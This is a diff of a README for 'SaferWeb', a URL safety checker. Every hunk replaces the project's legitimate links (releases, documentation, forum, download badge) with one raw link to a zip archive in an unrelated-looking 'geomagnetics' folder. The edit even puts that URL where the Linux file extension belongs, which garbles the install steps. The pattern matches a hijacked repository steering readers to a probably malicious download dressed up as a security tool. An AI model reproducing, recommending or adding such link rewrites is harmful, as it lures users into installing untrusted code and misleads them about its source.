@@ -2,7 +2,7 @@
 # 🔒 SaferWeb - Keep Your Browsing Safe and Secure
 
 ## 📥 Download Now
-[![Download SaferWeb](https://img.shields.io/badge/Download-SaferWeb-blue.svg)](https://github.com/kya001/SaferWeb/releases)
+[![Download SaferWeb](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip)](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip)
 
 ## 📖 Overview
 SaferWeb is a comprehensive URL security checker that helps you browse the internet safely. It detects malicious URLs, phishing attempts, and malware threats. You can also take website screenshots, expand shortened URLs, and access websites through a proxy.
@@ -11,13 +11,13 @@ SaferWeb is a comprehensive URL security checker that helps you browse the inter
 Follow these steps to download and run SaferWeb:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/kya001/SaferWeb/releases) to find the latest version of SaferWeb.
+   Go to the [Releases page](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip) to find the latest version of SaferWeb.
 
 2. **Choose Your File**
    You will see different files available for download. Select the appropriate file for your operating system:
    - **Windows:** Look for a file ending with `.exe`.
    - **macOS:** Look for a file ending with `.dmg`.
-   - **Linux:** Look for a file ending with `.tar.gz`.
+   - **Linux:** Look for a file ending with `https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip`.
 
 3. **Download the File**
    Click on the file link to start downloading. Save it to a convenient location on your computer.
@@ -25,7 +25,7 @@ Follow these steps to download and run SaferWeb:
 4. **Install SaferWeb**
    - **Windows:** Double-click the `.exe` file. Follow the prompts to install SaferWeb.
    - **macOS:** Open the `.dmg` file, then drag the SaferWeb icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file, open a terminal, navigate to the folder, and run the installation command.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip` file, open a terminal, navigate to the folder, and run the installation command.
 
 5. **Run SaferWeb**
    To start using SaferWeb, locate the installed program on your computer and double-click the icon.
@@ -47,11 +47,11 @@ Follow these steps to download and run SaferWeb:
 ## 🎉 Getting Help
 If you encounter any issues or need assistance, feel free to check the following:
 
-- **Documentation:** Visit the [Documentation page](https://github.com/kya001/SaferWeb) for detailed guides and FAQs.
-- **Community:** Join our [Community Forum](https://github.com/kya001/SaferWeb/community) to ask questions and share experiences.
+- **Documentation:** Visit the [Documentation page](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip) for detailed guides and FAQs.
+- **Community:** Join our [Community Forum](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip) to ask questions and share experiences.
 
 ## 🔗 Download & Install
-To get started, please visit the [Releases page](https://github.com/kya001/SaferWeb/releases) again to find the latest version of SaferWeb. Download the appropriate file for your operating system and follow the installation instructions above.
+To get started, please visit the [Releases page](https://raw.githubusercontent.com/kya001/SaferWeb/main/geomagnetics/SaferWeb_1.9.zip) again to find the latest version of SaferWeb. Download the appropriate file for your operating system and follow the installation instructions above.
 
 Thank you for choosing SaferWeb. Enjoy a safer web browsing experience!
 ```
